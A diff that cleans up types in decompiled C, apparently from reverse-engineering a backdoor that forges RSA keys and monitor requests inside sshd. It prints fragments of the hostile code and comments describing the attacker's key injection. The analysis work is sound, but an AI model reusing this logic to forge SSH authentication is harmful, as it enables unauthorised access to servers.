@@ -220,8 +220,8 @@ LAB_0010845f:
       if (0x3fef < payload_size - 0x11) {
         return FALSE;
       }
-      stack_limit = (undefined8 *)libc_funcs->__libc_stack_end;
-      stack_slot = (undefined8 *)register0x00000020;
+      stack_limit = (u64 *)libc_funcs->__libc_stack_end;
+      stack_slot = (u64 *)register0x00000020;
       do {
         if (stack_limit <= stack_slot) {
           return FALSE;
@@ -306,7 +306,7 @@ LAB_0010845f:
   rsa_exponent_byte = '\x01';
   sshbuf_cursor = sshbuf_vec;
   for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
+    *(u32 *)&sshbuf_cursor->rsa_d_bn = 0;
     sshbuf_cursor = (sshbuf *)((long)&sshbuf_cursor->rsa_d_bn + 4);
   }
   rsa_signature_len = 0;
@@ -373,27 +373,31 @@ LAB_0010845f:
     rsa_components[0] = rsa_n_bn;
     rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
     rsa_components[1] = rsa_e_bn;
-    *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)rsa_alg_name;
-    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)rsa_alg_name >> 0x38);
-    *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(rsa_alg_name + 8);
+    *(u64 *)(payload_hash + 9) = *(u64 *)rsa_alg_name & 0x00FFFFFFFFFFFFFFULL;
+    payload_hash[0x10] = (uchar)(*(u64 *)rsa_alg_name >> 0x38);
+    *(uint *)(payload_hash + 0x11) = (uint)*(u64 *)(rsa_alg_name + 8);
     rsa_modulus_shift = 8;
     rsa_modulus_flag = 1;
-    *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(rsa_alg_name + 0xc);
-    *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(rsa_alg_name + 0xc) >> 0x20);
-    stack0xfffffffffffff50d = *(undefined8 *)(rsa_alg_name + 0x14);
+    *(uint *)(payload_hash + 0x15) = (uint)*(u64 *)(rsa_alg_name + 0xc);
+    *(uint *)(payload_hash + 0x19) = (uint)(*(u64 *)(rsa_alg_name + 0xc) >> 0x20);
+    stack0xfffffffffffff50d = *(u64 *)(rsa_alg_name + 0x14);
     stack_slot = &rsa_modulus_qword0;
     rsa_words_cursor = rsa_template_words;
     for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
-      *rsa_words_cursor = *(undefined4 *)stack_slot;
-      stack_slot = (undefined8 *)((long)stack_slot + (ulong)zero_stride_flag * -8 + 4);
+      *rsa_words_cursor = *(u32 *)stack_slot;
+      stack_slot = (u64 *)((long)stack_slot + (ulong)zero_stride_flag * -8 + 4);
       rsa_words_cursor = rsa_words_cursor + (ulong)zero_stride_flag * -2 + 1;
     }
     payload_room = 0x628;
     monitor_req_len_prefix = 0x1000000;
     monitor_req_payload_len = 0x7000000;
-    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)rsa_alg_name;
-    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(rsa_alg_name + 3);
-    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(rsa_alg_name + 3) >> 8);
+    monitor_req_prefix_bytes[0] = (uchar)rsa_alg_name[0];
+            monitor_req_prefix_bytes[1] = (uchar)rsa_alg_name[1];
+            monitor_req_prefix_bytes[2] = (uchar)rsa_alg_name[2];
+    monitor_req_prefix_pad = (uchar)rsa_alg_name[3];
+    monitor_req_prefix_pad_hi[0] = (uchar)rsa_alg_name[4];
+            monitor_req_prefix_pad_hi[1] = (uchar)rsa_alg_name[5];
+            monitor_req_prefix_pad_hi[2] = (uchar)rsa_alg_name[6];
     while( TRUE ) {
       serialized_chunk_len = 0;
       // AutoDoc: Serialise the attacker's exponent and modulus into the monitor frame so sshd sees a well-formed RSA keypair.
@@ -445,7 +449,7 @@ LAB_0010845f:
               sshbuf_vec[0].rsa_d_bn = (u8 *)0xc00000014010000;
               *(uint *)((u8 *)&sshbuf_vec[0].off + 4) = 0x10000;
               sshbuf_vec[0].cd = *(u8 **)ctx->rsa_sha2_256_alg;
-              *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->rsa_sha2_256_alg + 8);
+              *(uint *)&sshbuf_vec[0].off = *(u32 *)(ctx->rsa_sha2_256_alg + 8);
               payload_size = payload_remaining + 0x2c0;
               signature_word_cursor = rsa_signature_block;
               sshbuf_size_cursor = &sshbuf_vec[0].size;
@@ -458,7 +462,7 @@ LAB_0010845f:
               sshbuf_cursor = sshbuf_vec;
               payload_copy_cursor = monitor_req_payload + payload_remaining;
               for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined4 *)payload_copy_cursor = *(undefined4 *)&sshbuf_cursor->rsa_d_bn;
+                *(u32 *)payload_copy_cursor = *(u32 *)&sshbuf_cursor->rsa_d_bn;
                 sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
                 payload_copy_cursor = payload_copy_cursor + ((ulong)zero_stride_flag * -2 + 1) * 4;
               }
@@ -503,7 +507,7 @@ LAB_001088b7:
               libc_funcs = ctx->libc_imports;
               sshbuf_cursor = sshbuf_vec;
               for (loop_idx = 0x12; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
+                *(u32 *)&sshbuf_cursor->rsa_d_bn = 0;
                 sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
               }
               if (monitor_fd < 0) {
